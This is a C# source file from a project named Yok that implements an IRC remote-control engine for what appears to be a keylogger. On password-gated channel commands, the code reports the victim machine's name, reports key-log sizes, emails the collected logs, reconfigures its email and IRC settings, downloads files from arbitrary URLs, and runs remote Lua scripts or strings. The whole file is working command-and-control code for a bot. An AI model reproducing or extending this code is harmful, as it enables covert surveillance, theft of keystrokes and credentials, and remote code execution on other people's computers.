// Yok 
// https://github.com/erickjung/yok
//
// Copyright (c) 2012-2015 Erick Jung
//
// This code is distributed under the terms and conditions of the MIT license.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
// THE SOFTWARE.

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using log4net;
using Meebey.SmartIrc4net;
using yok.Util;

namespace yok.App.Engine
{
    /// <summary>
    ///     Irc engine
    /// </summary>
    public class IrcEngine
    {
        private static readonly ILog Logger = LogManager.GetLogger(typeof (IrcEngine));
        private static IrcEngine _ircInstance;
        private IrcFeatures _irc;
        private string _ircChannel = "";
        private Thread _irclisten;
        private string _ircNick = "";
        private int _ircPort;
        private string _ircServer = "";

        /// <summary>
        ///     Private constructor
        /// </summary>
        private IrcEngine()
        {
            // do nothing
        }

        /// <summary>
        ///     Get the main irc engine instance
        /// </summary>
        /// <returns>The instance</returns>
        public static IrcEngine GetInstance()
        {
            return _ircInstance ?? (_ircInstance = new IrcEngine());
        }

        /// <summary>
        ///     Start the irc connection
        /// </summary>
        /// <returns>True if is ok</returns>
        public bool Start()
        {
            var ret = false;

            Logger.Info("Starting...");

            try
            {
                _irc = new IrcFeatures();
                _irc.OnConnected += OnConnected;
                _irc.OnDisconnected += OnDisconnected;
                _irc.OnReadLine += OnReadLine;
                _irc.OnChannelMessage += OnMessage;
                _irc.AutoRetry = true;
                _irc.AutoRetryLimit = 0;
                _irc.AutoRetryDelay = 120;
                _irc.AutoReconnect = true;
                _irc.AutoRelogin = true;
                _irc.AutoRejoin = true;
                _irc.AutoNickHandling = false;
                _irc.ActiveChannelSyncing = true;
                _irc.SendDelay = 250;

                _ircServer = Config.GetStringValue(Globals.YokXmlIrcserver);
                _ircPort = Config.GetIntValue(Globals.YokXmlIrcport);
                _ircChannel = Config.GetStringValue(Globals.YokXmlIrcchannel);
                _ircNick = Config.GetStringValue(Globals.YokXmlIrcnick);

                _irc.Connect(_ircServer, _ircPort);

                _irc.Login("yok_" + _ircNick, "remote yok", 0, "IRCYOK");

                _irclisten = new Thread(IrcListenThread);
                _irclisten.Start();

                Directory.CreateDirectory(Utils.GetBasePath() + "\\scripts");

                Logger.Info("Started Succesfully");

                ret = true;
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }

            return ret;
        }

        /// <summary>
        ///     Stop irc connection
        /// </summary>
        /// <returns>True if is ok</returns>
        public bool Stop()
        {
            var ret = false;

            try
            {
                if (_irc.IsConnected)
                {
                    _irc.Disconnect();
                }

                ret = true;
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }

            return ret;
        }

        /// <summary>
        ///     The main irc listen thread
        /// </summary>
        private void IrcListenThread()
        {
            try
            {
                _irc.Listen();
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }

        /// <summary>
        ///     Disconnect callback
        /// </summary>
        /// <param name="o"></param>
        /// <param name="e"></param>
        private void OnDisconnected(object o, EventArgs e)
        {
            try
            {
                Logger.Info("Trying to disconnect...");

                if (Config.GetBoolValue(Globals.YokXmlUseirc))
                {
                    Logger.Info("NOT Disconnected");

                    _irc.Connect(_ircServer, _ircPort);
                    _irc.Login("yok_" + _ircNick, "remote yok", 0, "IRCYOK");
                }
                else
                {
                    Logger.Info("Disconnected");
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }

        /// <summary>
        ///     On connected callback
        /// </summary>
        /// <param name="o"></param>
        /// <param name="e"></param>
        private static void OnConnected(object o, EventArgs e)
        {
            Logger.Info("Connected");
        }

        /// <summary>
        ///     Lua callback
        /// </summary>
        /// <param name="text">string from lua vm</param>
        private void LuaCallback(string text)
        {
            Logger.Info("[LUA] " + text);

            _irc.SendMessage(SendType.Message, _ircChannel, text);
        }

        /// <summary>
        ///     Download callback
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DonwloadCallback(object sender, AsyncCompletedEventArgs e)
        {
            _irc.SendMessage(SendType.Message, _ircChannel, "Download ok");
        }

        /// <summary>
        ///     Message callback
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnMessage(object sender, IrcEventArgs e)
        {
            try
            {
                if (e.Data.Channel.ToLower() == _ircChannel)
                {
                    if (e.Data.Message.StartsWith("!yok_" + _ircNick + " "))
                    {
                        var delimiters = new[] {' ', '=', ':'};
                        var pars =
                            new List<string>(e.Data.Message.Split(delimiters, StringSplitOptions.RemoveEmptyEntries));

                        try
                        {
                            CheckParams(pars);
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }

        /// <summary>
        ///     Check all the irc parameters
        /// </summary>
        /// <param name="pars">The list of parameters</param>
        private void CheckParams(IList<string> pars)
        {
            if (pars.Count < 3)
            {
                Logger.Info("error param count: " + pars.Count);

                return;
            }

            var parPass = pars[1];
            var parCommand = pars[2];

            Logger.Info("cmd: " + parCommand);

            if (parPass.Equals(Config.GetStringValue(Globals.YokXmlInputpwd)))
            {
                switch (parCommand.ToLower())
                {
                    case "help":
                        Logger.Info("[IRC Command] help");

                        _irc.SendMessage(SendType.Message, _ircChannel, "yok version - " + Assembly.GetExecutingAssembly().GetName().Version);
                        _irc.SendMessage(SendType.Message, _ircChannel, "commands:");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[targetname]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[sendemail]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[loginfo]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[disconnect]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[ch_email:login:passwd:smtp:smtpport:ssl:to:subject:message]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[ch_irc:server:port:channel:nick]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[lua_files]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[lua_download:httppath]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[lua_exec:scriptname]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[lua_execstr:luastring]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "[lua_del:scriptname]");
                        _irc.SendMessage(SendType.Message, _ircChannel, "end");
                        break;
                    case "targetname":
                        Logger.Info("[IRC Command] targetname");

                        _irc.SendMessage(SendType.Message, _ircChannel, Environment.MachineName);
                        break;
                    case "sendemail":
                    {
                        Logger.Info("[IRC Command] sendemail");

                        _irc.SendMessage(SendType.Message, _ircChannel, "Email sent");

                        new Thread(() =>
                        {
                            Logger.Info("[IRC THREAD SINGLE START]");

                            if (!EmailEngine.Send())
                            {
                                Logger.Info("[ERROR] - sendEmail");

                                return;
                            }

                            Logger.Info("[IRC THREAD SINGLE END]");
                        }).Start();
                    }

                        break;
                    case "loginfo":
                    {
                        Logger.Info("[IRC Command] loginfo");

                        var strAttributes = "Logs Info:\n";

                        var f = new FileInfo(Logs.LogProc);

                        if (f.Exists)
                        {
                            strAttributes += Globals.YokFileLog + " size: " + f.Length + " bytes\n";
                        }

                        f = new FileInfo(Logs.LogKey);

                        if (f.Exists)
                        {
                            strAttributes += Globals.YokFileKey + " size: " + f.Length + " bytes";
                        }

                        _irc.SendMessage(SendType.Message, _ircChannel, strAttributes);
                    }
                        break;
                    case "disconnect":
                    {
                        Logger.Info("[IRC Command] disconnect");

                        _irc.SendMessage(SendType.Message, _ircChannel, "bye bye :)");
                        _irc.Disconnect();
                    }
                        break;
                    case "ch_email":
                    {
                        Logger.Info("[IRC Command] ch_email");

                        if (pars.Count < 11)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel,
                                "Params needed: login:passwd:smtp:smtpport:ssl:to:subject:message");
                            return;
                        }

                        double num;

                        var isNum = double.TryParse(pars[6], out num);

                        if (!isNum)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "Smtp Port need to be a number (e.g 587)");

                            return;
                        }

                        isNum = double.TryParse(pars[7], out num); // ssl

                        if (!isNum)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "SSL need to be a number (e.g 1 or 0)");

                            return;
                        }

                        Config.SetStringValue(Globals.YokXmlEmaillogin, pars[3]);
                        Config.SetStringValue(Globals.YokXmlEmailpwd, pars[4]);
                        Config.SetStringValue(Globals.YokXmlEmailsmtp, pars[5]);
                        Config.SetStringValue(Globals.YokXmlEmailsmtpport, pars[6]);
                        Config.SetStringValue(Globals.YokXmlEmailssl, pars[7]);
                        Config.SetStringValue(Globals.YokXmlEmailto, pars[8]);
                        Config.SetStringValue(Globals.YokXmlEmailsubject, pars[9]);
                        Config.SetStringValue(Globals.YokXmlEmailmsg, pars[10]);

                        _irc.SendMessage(SendType.Message, _ircChannel, "EmailEngine conf changed!");
                    }
                        break;
                    case "ch_irc":
                    {
                        Logger.Info("[IRC Command] ch_irc");

                        if (pars.Count < 7)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "Params needed: server:port:channel:nick");
                            return;
                        }

                        double num;

                        var isNum = double.TryParse(pars[4], out num);

                        if (!isNum)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "Port need to be a number (e.g 6667)");
                            return;
                        }

                        Config.SetStringValue(Globals.YokXmlIrcserver, Crypt.Encrypt(pars[3]));
                        Config.SetStringValue(Globals.YokXmlIrcport, Crypt.Encrypt(pars[4]));
                        Config.SetStringValue(Globals.YokXmlIrcchannel, Crypt.Encrypt(pars[5]));
                        Config.SetStringValue(Globals.YokXmlIrcnick, Crypt.Encrypt(pars[6]));

                        _irc.SendMessage(SendType.Message, _ircChannel, "IRC conf changed!");
                    }
                        break;
                    case "lua_files":
                    {
                        Logger.Info("[IRC Command] lua_files");

                        var di = new DirectoryInfo(Utils.GetBasePath() + "\\scripts");

                        var rgFiles = di.GetFiles("*.lua");

                        _irc.SendMessage(SendType.Message, _ircChannel, "Number: " + rgFiles.Length);

                        foreach (var fi in rgFiles)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, fi.Name);
                        }
                    }
                        break;
                    case "lua_download":
                    {
                        Logger.Info("[IRC Command] lua_download");

                        if (pars.Count < 4)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "Params needed: httppath");
                            return;
                        }

                        try
                        {
                            var rgxUrl =
                                new Regex(
                                    "(([a-zA-Z][0-9a-zA-Z+\\-\\.]*:)?/{0,2}[0-9a-zA-Z;/?:@&=+$\\.\\-_!~*'()%]+)?(#[0-9a-zA-Z;/?:@&=+$\\.\\-_!~*'()%]+)?");

                            var toparse = pars[3];

                            if (pars.Count > 4)
                            {
                                toparse = pars[3] + ":" + pars[4];
                            }

                            if (rgxUrl.IsMatch(toparse))
                            {
                                string file;
                                var index = toparse.LastIndexOf('/') + 1;

                                if (index > 0)
                                {
                                    file = toparse.Substring(index, toparse.Length - index);

                                    if (file.Length <= 0)
                                    {
                                        _irc.SendMessage(SendType.Message, _ircChannel, "Invalid filename");
                                        return;
                                    }
                                }
                                else
                                {
                                    _irc.SendMessage(SendType.Message, _ircChannel, "Invalid url");
                                    return;
                                }

                                var webClient = new WebClient();
                                webClient.DownloadFileCompleted += DonwloadCallback;
                                webClient.DownloadFileAsync(new Uri(toparse), Utils.GetBasePath() + "\\scripts\\" + file);
                            }
                            else
                            {
                                _irc.SendMessage(SendType.Message, _ircChannel, "Invalid url");
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex);
                        }
                    }
                        break;
                    case "lua_exec":
                    {
                        Logger.Info("[IRC Command] lua_exec");

                        if (pars.Count < 4)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "Params needed: scriptname");

                            return;
                        }

                        try
                        {
                            var luaState = Lua.luaL_newstate();

                            if (luaState == IntPtr.Zero)
                            {
                                Logger.Info("lua error");

                                return;
                            }

                            //open the Lua libraries for table, string, math etc.
                            Lua.luaL_openlibs(luaState);

                            // set print callback
                            Lua.PrintCallback del = LuaCallback;
                            Lua.lua_setPrintCallback(del);

                            Lua.luaL_loadfile(luaState, "scripts/" + pars[3]);
                            Lua.lua_pcall(luaState, 0, Lua.LuaMultret, 0);

                            //clean up nicely
                            Lua.lua_close(luaState);
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex);

                            _irc.SendMessage(SendType.Message, _ircChannel, "LUA Exception!");
                        }

                        _irc.SendMessage(SendType.Message, _ircChannel, "LUA END!");
                    }
                        break;
                    case "lua_execstr":
                    {
                        Logger.Info("[IRC Command] lua_execstr");

                        if (pars.Count < 4)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "Params needed: luastring");

                            return;
                        }

                        try
                        {
                            var luaState = Lua.luaL_newstate();

                            if (luaState == IntPtr.Zero)
                            {
                                Logger.Info("lua error");
                                return;
                            }

                            //open the Lua libraries for table, string, math etc.
                            Lua.luaL_openlibs(luaState);

                            // set print callback
                            Lua.PrintCallback del = LuaCallback;
                            Lua.lua_setPrintCallback(del);

                            Lua.luaL_loadstring(luaState, pars[3]);
                            Lua.lua_pcall(luaState, 0, Lua.LuaMultret, 0);

                            //clean up nicely
                            Lua.lua_close(luaState);
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex);

                            _irc.SendMessage(SendType.Message, _ircChannel, "LUA Exception!");
                        }

                        _irc.SendMessage(SendType.Message, _ircChannel, "LUA END!");
                    }
                        break;
                    case "lua_del":
                    {
                        Logger.Info("[IRC Command] lua_del");

                        if (pars.Count < 4)
                        {
                            _irc.SendMessage(SendType.Message, _ircChannel, "Params needed: scriptname");
                            return;
                        }

                        try
                        {
                            File.Delete(Utils.GetBasePath() + "\\scripts\\" + pars[3]);
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex);
                        }
                    }
                        break;
                    default:
                    {
                        Logger.Info("[IRC Command] command not found");

                        _irc.SendMessage(SendType.Message, _ircChannel, "Command not found!");
                    }
                        break;
                }
            }
            else
            {
                Logger.Warn("Authentication error, trying to use: " + parPass);

                _irc.SendMessage(SendType.Message, _ircChannel, "Authentication error! [pass=command:change]");
            }
        }

        /// <summary>
        ///     Read line callback
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnReadLine(object sender, ReadLineEventArgs e)
        {
            try
            {
                var command = e.Line.Split(' ')[1];

                if (command.Equals("PING"))
                {
                    var server = e.Line.Split(' ')[2];

                    _irc.WriteLine("PONG " + server, Priority.Critical);
                }
                else if (command.Equals("422") || command.Equals("376")) // 422: motd missing // 376: end of motd
                {
                    _irc.RfcJoin(_ircChannel);
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex);
            }
        }
    }
}